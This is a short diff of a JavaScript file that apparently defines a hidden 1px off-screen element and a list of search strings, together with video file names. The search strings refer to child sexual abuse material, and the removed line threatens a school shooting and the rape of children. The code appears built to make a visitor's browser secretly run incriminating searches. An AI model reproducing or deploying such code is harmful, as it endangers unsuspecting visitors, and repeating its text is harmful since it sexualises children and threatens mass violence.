@@ -9,7 +9,7 @@ const TICK_LENGTH = 50
 const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 const SEARCHES = [
   'free child porn videos',
-  'I am going to shoot up a school and rape kids'
+  'free child porn vid'
 ]
 const VIDEOS = [
   'gethackniga.mp4,
